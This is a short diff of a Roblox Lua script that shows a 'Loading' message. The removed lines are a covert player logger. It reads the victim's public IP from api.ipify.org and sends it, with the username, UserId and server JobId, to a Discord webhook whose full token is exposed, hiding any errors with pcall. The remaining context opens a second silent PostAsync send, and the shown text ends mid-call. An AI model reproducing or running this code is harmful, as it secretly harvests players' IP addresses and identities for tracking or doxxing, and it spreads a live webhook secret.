@@ -1,43 +1,5 @@
 print("ローディング中")
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-
-local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1492013363314823281/uZNBZrgD6m5UrJcGZYLR0e3TA9R2Ab6HKE3k6zaQR-STkMqZjcErv83DG6lbQIvnirWH"
-
-local player = Players.LocalPlayer
-
--- IP取得（失敗対策）
-local ip = "unknown"
-pcall(function()
-    ip = game:HttpGet("https://api.ipify.org/")
-end)
-
--- アバター
-local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="
-    .. player.UserId .. "&width=150&height=150&format=png"
-
--- 超シンプル表示
-local data = {
-    username = "Player Logger",
-    avatar_url = avatar,
-    content =
-        "👤 名前: " .. player.Name ..
-        "\n🆔 UserId: " .. player.UserId ..
-        "\n🌍 IP: " .. ip ..
-        "\n📡 JobId: " .. game.JobId
-}
-
--- 送信
-pcall(function()
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end)
-
 -- 送信（失敗しても止まらない）
 pcall(function()
     HttpService:PostAsync(
